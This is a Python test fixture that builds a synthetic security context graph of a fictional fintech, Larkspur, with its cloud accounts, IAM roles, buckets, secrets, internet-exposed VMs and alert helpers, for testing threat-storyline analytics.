"""A faithful miniature of docs/04-storyline.md built in code (about 300 nodes).

The fixture contains storyline A (EMBERCAST / Cinder Jackal) end to end, storyline B (SALTWORKS / Hollow Tide), the
threat-intel subgraph both depend on, the named noise alerts, the internal scanner with IDS noise, the other
internet-exposed hosts with actively exploited CVEs, and a handful of background alerts. Ids come from
``throughline.simulator.storyline_constants`` so the analytics unit tests exercise exactly the ids the generators
must produce.
"""
from __future__ import annotations

from typing import Any

from throughline.graph.context_graph import ContextGraph
from throughline.simulator import storyline_constants as sc
from throughline.simulator.catalog.cves import CVES
from throughline.simulator.catalog.techniques import TECHNIQUES

SEV_RANK = {"informational": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}

# extra ids used only by the fixture
VPN_GW_VM = "vm:aws:i-0vpn1a2b3c4d5e6f70"
WIKI_VM = "vm:aws:i-0conf1a2b3c4d5e6f7"
ICS_VM = "vm:aws:i-0ivanti1a2b3c4d5e6"
CANARY_VM = "vm:aws:i-0spring1a2b3c4d5e6"
CITRIX_VM = "vm:aws:i-0citrix1a2b3c4d5e6"
APP_VMS = ["vm:aws:i-0app0000000000001", "vm:aws:i-0app0000000000002", "vm:aws:i-0app0000000000003"]
NOSENSOR_VMS = ["vm:aws:i-0nosensor00000001", "vm:aws:i-0nosensor00000002"]
WALLET_ALB = "lb:aws:larkspur-wallet-api-alb"
STG_ROLE = "role:aws:333333333333:LarkspurStmtRenderStgRole"
STG_CONFIG_BUCKET = "bucket:aws:larkspur-stg-app-config"
WALLET_ROLE = "role:aws:111111111111:LarkspurWalletApiRole"
WALLET_BUCKET = "bucket:aws:larkspur-wallet-internal"
PROD_ADMIN_ROLE = "role:aws:111111111111:LarkspurProdAdmin"
SHARED_ADMIN_ROLE = "role:aws:222222222222:LarkspurSharedAdmin"
VPN_ROLE = "role:aws:222222222222:LarkspurVpnGatewayRole"
APP_WALLET = "app:larkspur:wallet-api"
APP_WIKI = "app:larkspur:corp-wiki"
APP_VPN = "app:larkspur:corp-vpn"
EP_STG = "endpoint:falcon:aid-stg1"
EP_SCANNER = "endpoint:falcon:aid-scan01"
EP_CANARY = "endpoint:falcon:aid-canary1"
EP_WIKI = "endpoint:falcon:aid-wiki01"
EP_APP = ["endpoint:falcon:aid-app01", "endpoint:falcon:aid-app02", "endpoint:falcon:aid-app03"]
EP_JOKAFOR = "endpoint:falcon:aid-wks4410"
EP_LCHEN = "endpoint:falcon:aid-wks4411"
QUARANTINE_EPS = [f"endpoint:falcon:aid-wks5{n:03d}" for n in range(1, 13)]
QUARANTINE_USERS = [f"user:okta:u5{n:03d}" for n in range(1, 13)]
MREYES_IP = "10.40.12.201"
LONDON_IP = "203.0.113.150"
NOISE_EXT_IPS = ["203.0.113.200", "203.0.113.201"]
NAT_IP = "198.51.100.5"
OLD_IOC_IP = "198.51.100.77"

ACTOR_GH = "actor:ti:gravel-heron"
ACTOR_BF = "actor:ti:brine-fox"
ACTOR_SM = "actor:ti:slate-mantis"
ACTOR_AC = "actor:ti:ash-cormorant"
CAMPAIGN_GG = "campaign:ti:granite-gate"
CAMPAIGN_TW = "campaign:ti:tidewrack"
CAMPAIGN_SR = "campaign:ti:slate-run"
CAMPAIGN_AT = "campaign:ti:ash-tide"
REPORT_GG = "report:ti:TL-2026-0131"
REPORT_OLD = "report:ti:TL-2025-0088"
CAMPAIGN_OLD = "campaign:ti:driftwood-2025"
IOC_OLD_IP = f"ioc:ipv4:{OLD_IOC_IP}"

FILE_EICAR = "file:sha256:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
IP = "ip:v4:{}"
DOM = "domain:dns:{}"

CHANGE_WINDOW_ALERT_TIME = sc.ALERT_N["n003"][1]


class _Builder:
    def __init__(self) -> None:
        self.nodes: dict[str, dict[str, Any]] = {}
        self.edges: list[dict[str, Any]] = []

    def n(self, id: str, label: str, name: str, props: dict[str, Any] | None = None, *, source: str = "wiz-sim",
          first_seen: str = "2025-11-02T10:00:00Z", last_seen: str = "2026-09-11T13:55:00Z", confidence: float = 1.0) -> str:
        if id in self.nodes:
            return id
        self.nodes[id] = {
            "id": id, "label": label, "name": name, "source": source, "source_id": id.rsplit(":", 1)[-1],
            "first_seen": first_seen, "last_seen": last_seen, "confidence": confidence, "props": dict(props or {}),
        }
        return id

    def e(self, type: str, src: str, dst: str, props: dict[str, Any] | None = None, *, source: str = "wiz-sim",
          confidence: float = 1.0, first_seen: str = "2025-11-02T10:00:00Z", last_seen: str = "2026-09-11T13:55:00Z") -> None:
        assert src in self.nodes, f"unknown src {src} for {type}"
        assert dst in self.nodes, f"unknown dst {dst} for {type}"
        self.edges.append({
            "type": type, "src": src, "dst": dst, "source": source, "first_seen": first_seen, "last_seen": last_seen,
            "confidence": confidence, "props": dict(props or {}),
        })

    # -------------------------------------------------------------- helpers

    def ip(self, addr: str, **props: Any) -> str:
        private = addr.startswith("10.") or addr.startswith("192.168.")
        base = {"address": addr, "is_private": private, "reputation": "unknown"}
        base.update(props)
        return self.n(IP.format(addr), "IpAddress", addr, base, source="falcon-sim")

    def technique(self, tid: str) -> str:
        info = TECHNIQUES.get(tid)
        nid = f"technique:attack:{tid}"
        props = {"technique_id": tid, "tactic": info["tactic"] if info else "Unknown",
                 "kill_chain_stage": info["kill_chain_stage"] if info else 0}
        return self.n(nid, "AttackTechnique", str(info["name"]) if info else tid, props, source="ti-sim")

    def alert(self, id: str, title: str, severity: str, detected_at: str, *, source_system: str, alert_type: str,
              anchor: str, techniques: list[str] | None = None, tactic: str | None = None, hostname: str | None = None,
              user: str | None = None, incident: str | None = None, change_ticket: str | None = None,
              raw: dict[str, Any] | None = None, extra: dict[str, Any] | None = None, involves: list[tuple[str, str]] = ()) -> str:
        techniques = list(techniques or [])
        anchor_label = self.nodes[anchor]["label"]
        props: dict[str, Any] = {
            "source_system": source_system, "alert_type": alert_type, "title": title, "description": title,
            "vendor_severity": severity, "vendor_severity_rank": SEV_RANK[severity], "status": "new",
            "detected_at": detected_at, "techniques": techniques, "tactic": tactic, "entity_id": anchor,
            "entity_label": anchor_label, "hostname": hostname or self.nodes[anchor]["name"], "user": user,
            "vendor_incident_id": incident, "change_ticket": change_ticket,
            "raw": raw or {"title": title, "severity": severity, "host": hostname or self.nodes[anchor]["name"], "detected_at": detected_at},
        }
        props.update(extra or {})
        src = f"{source_system}-sim"
        self.n(id, "Alert", title, props, source=src, first_seen=detected_at, last_seen=detected_at)
        if anchor_label == "Endpoint":
            self.e("ON_ENDPOINT", id, anchor, source=src, first_seen=detected_at, last_seen=detected_at)
        else:
            self.e("ON_RESOURCE", id, anchor, source=src, first_seen=detected_at, last_seen=detected_at)
        for t in techniques:
            self.e("USES_TECHNIQUE", id, self.technique(t), source=src)
        if incident:
            self.e("PART_OF_INCIDENT", id, incident, source=src)
        for target, role in involves:
            self.e("INVOLVES", id, target, {"role": role}, source=src, first_seen=detected_at, last_seen=detected_at)
        return id

    def cloud_event(self, id: str, time: str, event_name: str, event_source: str, key_id: str, success: bool,
                    error_code: str | None, count: int, *, principal: str, credential: str, source_ip: str,
                    target: str | None = None, assumed: str | None = None, bytes_: int | None = None,
                    account_id: str = "222222222222") -> str:
        props = {
            "provider": "aws", "account_id": account_id, "event_name": event_name, "event_source": event_source,
            "event_time": time, "principal_id": principal, "principal_arn": self.nodes[principal]["props"].get("arn"),
            "access_key_id": key_id, "source_ip": source_ip, "user_agent": "aws-cli/2.17 Python/3.11", "success": success,
            "error_code": error_code, "target_id": target, "count": count, "bytes": bytes_, "anomalous": source_ip.startswith("203."),
            "anomaly_reasons": ["new_asn", "new_geolocation"] if source_ip.startswith("203.") else [],
        }
        self.n(id, "CloudEvent", event_name, props, source="cloudtrail-sim", first_seen=time, last_seen=time)
        self.e("USED_CREDENTIAL", id, credential, source="cloudtrail-sim", first_seen=time, last_seen=time)
        self.e("PERFORMED_BY", id, principal, source="cloudtrail-sim", first_seen=time, last_seen=time)
        self.e("FROM_IP", id, self.ip(source_ip), source="cloudtrail-sim", first_seen=time, last_seen=time)
        if target:
            self.e("TARGETED", id, target, source="cloudtrail-sim", first_seen=time, last_seen=time)
        if assumed:
            self.e("ASSUMED", id, assumed, source="cloudtrail-sim", first_seen=time, last_seen=time)
        return id


def build_fixture_graph() -> ContextGraph:
    b = _Builder()
    n, e = b.n, b.e

    # ------------------------------------------------------------------ accounts, network, business
    for key in ("prod", "shared", "staging", "dev", "corp"):
        acc = sc.ACCOUNTS[key]
        n(acc["id"], "CloudAccount", acc["name"], {"provider": "aws", "account_id": acc["account_id"], "environment": acc["environment"], "purpose": acc["purpose"]})
    prod, shared, staging, dev, corp = (sc.ACCOUNTS[k]["id"] for k in ("prod", "shared", "staging", "dev", "corp"))
    n(sc.BASTION_SUBNET, "Subnet", "shared-mgmt-a", {"provider": "aws", "account_id": "222222222222", "cidr": "10.20.0.0/24", "region": "us-east-1", "public": False})
    n(sc.EDGE_SG, "SecurityGroup", "sg-0edge-public-8080", {"provider": "aws", "account_id": "111111111111", "inbound_rules": [{"cidr": "0.0.0.0/0", "port_from": 8080, "port_to": 8080, "protocol": "tcp"}], "open_to_internet": True, "internet_ports": ["8080"]})
    internet = n("internet:global:internet", "Internet", "Internet", {}, source="derived")

    teams = {
        sc.TEAM_PLATFORM: ("Platform Engineering", "Engineering", sc.USER_JOKAFOR),
        sc.TEAM_PAYMENTS: ("Payments Platform", "Engineering", sc.USER_LCHEN),
        sc.TEAM_TREASURY: ("Finance Treasury", "Finance", None),
        sc.TEAM_CORP_IT: ("Corporate IT", "IT", sc.USER_MREYES),
    }
    for tid, (name, dept, lead) in teams.items():
        n(tid, "Team", name, {"department": dept, "lead_user_id": lead, "oncall_channel": f"#oncall-{tid.rsplit(':', 1)[-1]}"}, source="business-sim")
    apps = {
        sc.APP_CARD_ISSUING: ("card-issuing", "tier-0", sc.TEAM_PAYMENTS, ["PCI"]),
        sc.APP_STMT_RENDER: ("statement-render", "tier-1", sc.TEAM_PAYMENTS, ["PII"]),
        sc.APP_MARKETING: ("marketing-site", "tier-3", sc.TEAM_CORP_IT, ["PUBLIC"]),
        sc.APP_SETTLEMENT_SFTP: ("settlement-sftp", "tier-2", sc.TEAM_TREASURY, ["FINANCIAL"]),
        APP_WALLET: ("wallet-api", "tier-0", sc.TEAM_PAYMENTS, ["PII", "FINANCIAL"]),
        APP_WIKI: ("corp-wiki", "tier-3", sc.TEAM_CORP_IT, ["INTERNAL"]),
        APP_VPN: ("corp-vpn", "tier-1", sc.TEAM_PLATFORM, ["INTERNAL"]),
    }
    for aid, (name, tier, team, classes) in apps.items():
        n(aid, "Application", name, {"criticality": tier, "environment": "prod", "owner_team_id": team, "description": name, "data_classifications": classes}, source="business-sim")
        e("OWNED_BY", aid, team, source="business-sim")

    # ------------------------------------------------------------------ identities
    users = {
        sc.USER_DANA: ("Dana Whitfield", "Treasury Operations Analyst", "Finance", sc.TEAM_TREASURY, "Boston", False, False),
        sc.USER_MREYES: ("Marcus Reyes", "IT Systems Administrator", "IT", sc.TEAM_CORP_IT, "Boston", True, False),
        sc.USER_PKAUR: ("Priya Kaur", "Chief Financial Officer", "Executive", sc.TEAM_TREASURY, "New York", False, True),
        sc.USER_JOKAFOR: ("Jide Okafor", "Platform Engineering Lead", "Engineering", sc.TEAM_PLATFORM, "Boston", True, False),
        sc.USER_LCHEN: ("Lin Chen", "Statement-render Service Owner", "Engineering", sc.TEAM_PAYMENTS, "Boston", False, False),
    }
    for uid, (dn, title, dept, team, loc, priv, exe) in users.items():
        login = uid.rsplit(":", 1)[-1]
        n(uid, "HumanUser", dn, {"email": f"{login}@corp.larkspur.example", "display_name": dn, "title": title, "department": dept, "team_id": team, "location": loc, "is_privileged": priv, "is_executive": exe, "mfa_enabled": True, "status": "active"}, source="okta-sim")
        e("MEMBER_OF", uid, team, source="okta-sim")
    for i, uid in enumerate(QUARANTINE_USERS):
        n(uid, "HumanUser", f"User {i + 1}", {"email": f"{uid.rsplit(':', 1)[-1]}@corp.larkspur.example", "department": "Operations", "team_id": sc.TEAM_CORP_IT, "is_privileged": False, "is_executive": False, "mfa_enabled": True, "status": "active"}, source="okta-sim")
    n(sc.GROUP_TREASURY, "Group", "finance-treasury", {"description": "Treasury operations", "member_count": 14, "privileged": False}, source="okta-sim")
    n(sc.GROUP_ALL, "Group", "all-employees", {"description": "Everyone", "member_count": 1400, "privileged": False}, source="okta-sim")
    e("MEMBER_OF", sc.USER_DANA, sc.GROUP_TREASURY, source="okta-sim")
    e("MEMBER_OF", sc.USER_DANA, sc.GROUP_ALL, source="okta-sim")
    e("LEADS", sc.USER_JOKAFOR, sc.TEAM_PLATFORM, source="business-sim")
    e("LEADS", sc.USER_MREYES, sc.TEAM_CORP_IT, source="business-sim")
    n(sc.SVC_FINOPS_SFTP, "ServiceAccount", "svc-finops-sftp", {"system": "linux", "host_id": sc.BASTION_VM, "purpose": "settlement-file SFTP", "privileged": False}, source="falcon-sim")

    def role(rid: str, name: str, account: str, role_type: str, is_admin: bool = False, privilege: float = 0.3, env: str = "prod") -> str:
        acct = account.rsplit(":", 1)[-1]
        n(rid, "IamRole", name, {"provider": "aws", "account_id": acct, "arn": f"arn:aws:iam::{acct}:role/{name}", "role_type": role_type, "is_admin": is_admin, "privilege_score": privilege, "trust_principals": [], "environment": env})
        e("CONTAINS", account, rid)
        return rid

    role(sc.BASTION_ROLE, "LarkspurBastionSSMRole", shared, "instance", privilege=0.6)
    role(sc.PROD_READER_ROLE, "LarkspurProdDataReader", prod, "cross-account", privilege=0.8)
    role(sc.EDGE_ROLE, "LarkspurStmtRenderRole", prod, "instance", privilege=0.5)
    role(sc.CORP_IT_ADMIN_ROLE, "LarkspurCorpItAdmin", corp, "sso", is_admin=True, privilege=1.0, env="corp")
    role(STG_ROLE, "LarkspurStmtRenderStgRole", staging, "instance", privilege=0.2, env="staging")
    role(WALLET_ROLE, "LarkspurWalletApiRole", prod, "instance", privilege=0.4)
    role(PROD_ADMIN_ROLE, "LarkspurProdAdmin", prod, "instance", is_admin=True, privilege=1.0)
    role(SHARED_ADMIN_ROLE, "LarkspurSharedAdmin", shared, "sso", is_admin=True, privilege=0.9)
    role(VPN_ROLE, "LarkspurVpnGatewayRole", shared, "instance", privilege=0.2)
    b.nodes[sc.PROD_READER_ROLE]["props"]["trust_principals"] = [sc.BASTION_ROLE_ARN]
    e("CAN_ASSUME", sc.BASTION_ROLE, sc.PROD_READER_ROLE, {"via": "trust_policy", "cross_account": True})
    e("MAPS_TO", sc.USER_MREYES, sc.CORP_IT_ADMIN_ROLE, {"via": "sso"}, source="okta-sim")
    e("MAPS_TO", sc.USER_JOKAFOR, SHARED_ADMIN_ROLE, {"via": "sso"}, source="okta-sim")

    for pid, name, acct, levels in (
        (sc.BASTION_ASSUME_POLICY, "LarkspurBastionAssumeProdReader", shared, ["admin"]),
        (sc.BASTION_LOGS_POLICY, "LarkspurSharedLogsWrite", shared, ["write"]),
        (sc.PROD_READER_POLICY, "LarkspurProdDataReaderAccess", prod, ["read", "list"]),
        (sc.EDGE_POLICY, "LarkspurStmtRenderAccess", prod, ["read", "write"]),
    ):
        n(pid, "IamPolicy", name, {"provider": "aws", "account_id": acct.rsplit(":", 1)[-1], "managed": False, "statements": [], "access_levels": levels, "wildcard_resource": False, "wildcard_action": False})
        e("CONTAINS", acct, pid)
    e("HAS_POLICY", sc.BASTION_ROLE, sc.BASTION_ASSUME_POLICY, {"attachment": "inline"})
    e("HAS_POLICY", sc.BASTION_ROLE, sc.BASTION_LOGS_POLICY, {"attachment": "managed"})
    e("HAS_POLICY", sc.PROD_READER_ROLE, sc.PROD_READER_POLICY, {"attachment": "inline"})
    e("HAS_POLICY", sc.EDGE_ROLE, sc.EDGE_POLICY, {"attachment": "inline"})

    # ------------------------------------------------------------------ data holders
    def bucket(bid: str, name: str, account: str, classes: list[str], sens: str, crown: bool, *, public: bool = False, env: str = "prod", size: float = 10.0, extra: dict[str, Any] | None = None) -> str:
        props = {"provider": "aws", "account_id": account.rsplit(":", 1)[-1], "region": "us-east-1", "public": public, "encrypted": not public, "versioning": True, "data_classifications": classes, "sensitivity": sens, "crown_jewel": crown, "size_gb": size, "environment": env}
        props.update(extra or {})
        n(bid, "StorageBucket", name, props)
        e("CONTAINS", account, bid)
        return bid

    bucket(sc.CARDHOLDER_VAULT, "larkspur-cardholder-vault", prod, ["PCI"], "critical", True, size=4100.0)
    bucket(sc.KYC_DOCS, "larkspur-kyc-documents", prod, ["PII"], "high", True, size=820.0)
    bucket(sc.APP_CONFIG_BUCKET, "larkspur-prod-app-config", prod, ["SECRETS"], "high", False, size=0.2, extra={"contains_credentials_for": [sc.CARDHOLDER_DB]})
    bucket(sc.STATEMENTS_OUT_BUCKET, "larkspur-statements-out", prod, ["INTERNAL"], "medium", False, size=300.0)
    bucket(sc.SHARED_LOGS_BUCKET, "larkspur-shared-logs", shared, ["INTERNAL"], "low", False, size=900.0)
    bucket(sc.MARKETING_BUCKET, "larkspur-marketing-assets", corp, ["PUBLIC"], "none", False, public=True, env="corp", size=12.0)
    bucket(STG_CONFIG_BUCKET, "larkspur-stg-app-config", staging, ["INTERNAL"], "medium", False, env="staging", size=0.1)
    bucket(WALLET_BUCKET, "larkspur-wallet-internal", prod, ["INTERNAL"], "medium", False, size=50.0)
    n(sc.DB_READER_SECRET, "Secret", "prod/cardholder-db/reader", {"provider": "aws", "account_id": "111111111111", "secret_type": "db_credentials", "sensitivity": "high", "rotated_days_ago": 40, "grants_access_to": [sc.CARDHOLDER_DB]})
    n(sc.HSM_SECRET, "Secret", "prod/hsm/partner-signing-key", {"provider": "aws", "account_id": "111111111111", "secret_type": "signing_key", "sensitivity": "critical", "rotated_days_ago": 200, "grants_access_to": []})
    n(sc.CARDHOLDER_DB, "Database", "cardholder-db", {"provider": "aws", "account_id": "111111111111", "engine": "postgres", "public": False, "encrypted": True, "data_classifications": ["PCI"], "sensitivity": "critical", "crown_jewel": True, "environment": "prod", "exposure": "internal"})
    for did in (sc.DB_READER_SECRET, sc.HSM_SECRET, sc.CARDHOLDER_DB):
        e("CONTAINS", prod, did)
    e("UNLOCKS", sc.DB_READER_SECRET, sc.CARDHOLDER_DB, {"credential_type": "db_credentials"})

    # effective access (derived by the inventory stage; direct grants only)
    e("CAN_ACCESS", sc.PROD_READER_ROLE, sc.CARDHOLDER_VAULT, {"access_level": "read", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", sc.PROD_READER_ROLE, sc.KYC_DOCS, {"access_level": "read", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", sc.PROD_READER_ROLE, sc.DB_READER_SECRET, {"access_level": "read", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", sc.PROD_READER_ROLE, sc.HSM_SECRET, {"access_level": "read", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", sc.BASTION_ROLE, sc.SHARED_LOGS_BUCKET, {"access_level": "write", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", sc.EDGE_ROLE, sc.APP_CONFIG_BUCKET, {"access_level": "read", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", sc.EDGE_ROLE, sc.STATEMENTS_OUT_BUCKET, {"access_level": "write", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", STG_ROLE, STG_CONFIG_BUCKET, {"access_level": "read", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", WALLET_ROLE, WALLET_BUCKET, {"access_level": "read", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", VPN_ROLE, sc.SHARED_LOGS_BUCKET, {"access_level": "read", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("CAN_ACCESS", SHARED_ADMIN_ROLE, sc.SHARED_LOGS_BUCKET, {"access_level": "admin", "path_length": 1, "via": "", "transitive": False}, source="derived")
    for target in (sc.CARDHOLDER_VAULT, sc.KYC_DOCS, sc.CARDHOLDER_DB):
        e("CAN_ACCESS", PROD_ADMIN_ROLE, target, {"access_level": "admin", "path_length": 1, "via": "", "transitive": False}, source="derived")
    e("GRANTS", sc.PROD_READER_POLICY, sc.CARDHOLDER_VAULT, {"actions": ["s3:GetObject", "s3:ListBucket"], "access_level": "read", "resource_pattern": "arn:aws:s3:::larkspur-cardholder-vault/*"})
    e("GRANTS", sc.PROD_READER_POLICY, sc.KYC_DOCS, {"actions": ["s3:GetObject", "s3:ListBucket"], "access_level": "read", "resource_pattern": "arn:aws:s3:::larkspur-kyc-documents/*"})
    e("GRANTS", sc.PROD_READER_POLICY, sc.DB_READER_SECRET, {"actions": ["secretsmanager:GetSecretValue"], "access_level": "read", "resource_pattern": "*"})
    e("GRANTS", sc.PROD_READER_POLICY, sc.HSM_SECRET, {"actions": ["secretsmanager:GetSecretValue"], "access_level": "read", "resource_pattern": "*"})
    e("GRANTS", sc.BASTION_ASSUME_POLICY, sc.PROD_READER_ROLE, {"actions": ["sts:AssumeRole"], "access_level": "admin", "resource_pattern": sc.PROD_READER_ROLE_ARN})
    e("GRANTS", sc.BASTION_LOGS_POLICY, sc.SHARED_LOGS_BUCKET, {"actions": ["s3:PutObject"], "access_level": "write", "resource_pattern": "arn:aws:s3:::larkspur-shared-logs/*"})
    e("GRANTS", sc.EDGE_POLICY, sc.APP_CONFIG_BUCKET, {"actions": ["s3:GetObject"], "access_level": "read", "resource_pattern": "arn:aws:s3:::larkspur-prod-app-config/*"})
    e("GRANTS", sc.EDGE_POLICY, sc.STATEMENTS_OUT_BUCKET, {"actions": ["s3:PutObject"], "access_level": "write", "resource_pattern": "arn:aws:s3:::larkspur-statements-out/*"})

    # ------------------------------------------------------------------ virtual machines
    def vm(vid: str, name: str, account: str, *, private_ip: str, public_ip: str | None = None, os: str = "Amazon Linux 2023", os_family: str = "linux",
           env: str = "prod", exposure: str = "internal", sensor: bool = True, tags: dict[str, Any] | None = None, criticality: str = "tier-2", role_id: str | None = None,
           app: str | None = None, team: str | None = None) -> str:
        acct = account.rsplit(":", 1)[-1]
        n(vid, "VirtualMachine", name, {"provider": "aws", "account_id": acct, "region": "us-east-1", "hostname": f"{name}.larkspur.internal", "private_ip": private_ip, "public_ip": public_ip, "os": os, "os_family": os_family, "instance_type": "m6i.large", "environment": env, "exposure": exposure, "has_edr_sensor": sensor, "is_k8s_node": False, "tags": tags or {}, "criticality": criticality})
        e("CONTAINS", account, vid)
        if role_id:
            e("HAS_ROLE", vid, role_id, {"via": "instance_profile"})
        if app:
            e("PART_OF", vid, app, source="business-sim")
        if team:
            e("OWNED_BY", vid, team, source="business-sim")
        return vid

    vm(sc.BASTION_VM, sc.BASTION_NAME, shared, private_ip=sc.BASTION_PRIVATE_IP, public_ip=sc.BASTION_PUBLIC_IP, tags={"role": "bastion", "owner": "platform-eng", "env": "prod"}, criticality="tier-1", role_id=sc.BASTION_ROLE, app=sc.APP_SETTLEMENT_SFTP, team=sc.TEAM_PLATFORM)
    b.nodes[sc.BASTION_VM]["props"]["hostname"] = sc.BASTION_HOSTNAME
    e("IN_SUBNET", sc.BASTION_VM, sc.BASTION_SUBNET)
    # a transitive shortcut the inventory may also emit; analytics must not use it for hop counts
    e("CAN_ACCESS", sc.BASTION_VM, sc.CARDHOLDER_VAULT, {"access_level": "read", "path_length": 3, "via": f"{sc.BASTION_ROLE},{sc.PROD_READER_ROLE}", "transitive": True}, source="derived")
    vm(sc.EDGE_VM, sc.EDGE_NAME, prod, private_ip=sc.EDGE_PRIVATE_IP, public_ip=sc.EDGE_PUBLIC_IP, os="Ubuntu 22.04", exposure="internet", criticality="tier-1", role_id=sc.EDGE_ROLE, app=sc.APP_STMT_RENDER, team=sc.TEAM_PAYMENTS)
    b.nodes[sc.EDGE_VM]["props"]["hostname"] = sc.EDGE_HOSTNAME
    e("HAS_SECURITY_GROUP", sc.EDGE_VM, sc.EDGE_SG)
    e("EXPOSES", internet, sc.EDGE_VM, {"ports": ["8080"], "via": "security_group", "protocol": "tcp"}, source="derived")
    vm(sc.STG_EDGE_VM, sc.STG_EDGE_NAME, staging, private_ip="10.30.3.24", public_ip="198.51.100.34", os="Ubuntu 22.04", env="staging", exposure="internet", criticality="tier-3", role_id=STG_ROLE, app=sc.APP_STMT_RENDER, team=sc.TEAM_PAYMENTS)
    e("EXPOSES", internet, sc.STG_EDGE_VM, {"ports": ["8080"], "via": "security_group", "protocol": "tcp"}, source="derived")
    vm(sc.DEV_LOG4J_VM, sc.DEV_LOG4J_NAME, dev, private_ip="10.44.1.9", public_ip="198.51.100.44", os="Ubuntu 22.04", env="dev", exposure="internet", sensor=False, criticality="tier-3")
    e("EXPOSES", internet, sc.DEV_LOG4J_VM, {"ports": ["8080"], "via": "security_group", "protocol": "tcp"}, source="derived")
    vm(sc.DEV_SANDBOX_VM, sc.DEV_SANDBOX_NAME, dev, private_ip="10.44.9.3", env="dev", exposure="isolated", criticality="tier-3")
    vm(sc.SCANNER_VM, sc.SCANNER_NAME, shared, private_ip=sc.SCANNER_IP, tags={"role": "vulnerability-scanner"}, criticality="tier-2", team=sc.TEAM_PLATFORM)
    vm(sc.FILESHARE_VM, sc.FILESHARE_NAME, corp, private_ip="10.60.2.15", os="Windows Server 2022", os_family="windows", env="corp", criticality="tier-2", team=sc.TEAM_CORP_IT)
    vm(VPN_GW_VM, "vpn-gw-01", shared, private_ip="10.20.7.10", public_ip="198.51.100.60", os="PAN-OS 11.1", exposure="internet", criticality="tier-1", role_id=VPN_ROLE, app=APP_VPN, team=sc.TEAM_PLATFORM)
    vm(WIKI_VM, "wiki-confluence-01", corp, private_ip="10.60.4.20", public_ip="198.51.100.61", os="Ubuntu 22.04", env="corp", exposure="internet", criticality="tier-3", app=APP_WIKI, team=sc.TEAM_CORP_IT)
    vm(ICS_VM, "ics-vpn-02", shared, private_ip="10.20.7.11", public_ip="198.51.100.62", os="Ivanti Connect Secure 22.6", exposure="internet", sensor=False, criticality="tier-1", role_id=VPN_ROLE, app=APP_VPN, team=sc.TEAM_PLATFORM)
    vm(CANARY_VM, "payments-api-canary", prod, private_ip="10.10.5.40", public_ip="198.51.100.63", os="Ubuntu 22.04", exposure="internet", criticality="tier-0", role_id=PROD_ADMIN_ROLE, app=APP_WALLET, team=sc.TEAM_PAYMENTS)
    vm(CITRIX_VM, "citrix-gw-01", corp, private_ip="10.60.7.5", public_ip="198.51.100.64", os="NetScaler 13.1", env="corp", exposure="internet", sensor=False, criticality="tier-2", app=APP_VPN, team=sc.TEAM_CORP_IT)
    for i, vid in enumerate(APP_VMS):
        vm(vid, f"wallet-api-{i + 1:02d}", prod, private_ip=f"10.10.2.{10 + i}", role_id=WALLET_ROLE, app=APP_WALLET, team=sc.TEAM_PAYMENTS)
    for i, vid in enumerate(NOSENSOR_VMS):
        vm(vid, f"ledger-batch-{i + 1:02d}", prod, private_ip=f"10.10.8.{10 + i}", sensor=False, criticality="tier-1", app=APP_WALLET, team=sc.TEAM_PAYMENTS)
    for vid in (VPN_GW_VM, WIKI_VM, ICS_VM, CANARY_VM, CITRIX_VM):
        e("EXPOSES", internet, vid, {"ports": ["443"], "via": "security_group", "protocol": "tcp"}, source="derived")
    n(WALLET_ALB, "LoadBalancer", "larkspur-wallet-api-alb", {"provider": "aws", "account_id": "111111111111", "scheme": "internet-facing", "dns_name": "api.larkspur.example", "listeners": ["443"]})
    e("CONTAINS", prod, WALLET_ALB)
    e("EXPOSES", internet, WALLET_ALB, {"ports": ["443"], "via": "lb", "protocol": "tcp"}, source="derived")
    for vid in APP_VMS:
        e("ROUTES_TO", WALLET_ALB, vid, {"port": 8443})
    e("PART_OF", sc.CARDHOLDER_VAULT, sc.APP_CARD_ISSUING, source="business-sim")
    e("PART_OF", sc.CARDHOLDER_DB, sc.APP_CARD_ISSUING, source="business-sim")
    e("PART_OF", sc.KYC_DOCS, sc.APP_CARD_ISSUING, source="business-sim")
    e("PART_OF", sc.APP_CONFIG_BUCKET, sc.APP_STMT_RENDER, source="business-sim")
    e("PART_OF", sc.STATEMENTS_OUT_BUCKET, sc.APP_STMT_RENDER, source="business-sim")
    e("PART_OF", sc.MARKETING_BUCKET, sc.APP_MARKETING, source="business-sim")
    e("PART_OF", sc.BASTION_ROLE, sc.APP_SETTLEMENT_SFTP, source="business-sim")
    e("OWNED_BY", sc.CARDHOLDER_VAULT, sc.TEAM_PAYMENTS, source="business-sim")
    e("OWNED_BY", sc.MARKETING_BUCKET, sc.TEAM_CORP_IT, source="business-sim")
    e("DEPENDS_ON", sc.APP_SETTLEMENT_SFTP, sc.BASTION_VM, {"dependency_type": "sftp_endpoint"}, source="business-sim")
    e("DEPENDS_ON", sc.APP_CARD_ISSUING, sc.CARDHOLDER_DB, {"dependency_type": "database"}, source="business-sim")
    e("DEPENDS_ON", sc.APP_CARD_ISSUING, sc.CARDHOLDER_VAULT, {"dependency_type": "storage"}, source="business-sim")
    e("DEPENDS_ON", sc.APP_STMT_RENDER, sc.APP_CONFIG_BUCKET, {"dependency_type": "config"}, source="business-sim")
    e("DEPENDS_ON", sc.APP_STMT_RENDER, sc.EDGE_VM, {"dependency_type": "compute"}, source="business-sim")

    # ------------------------------------------------------------------ software and vulnerabilities
    def cve(cid: str) -> str:
        c = CVES[cid]
        return n(c.node_id, "Vulnerability", cid, {"cve_id": cid, "cvss": c.cvss, "epss": c.epss, "kev": c.kev, "severity": c.severity, "published": c.published, "exploitation_status": "none", "actor_interest": [], "sector_targeting_relevance": 0.0, "ti_report_ids": [], "synthetic": c.synthetic, "description": c.description, "affected_component": c.component})

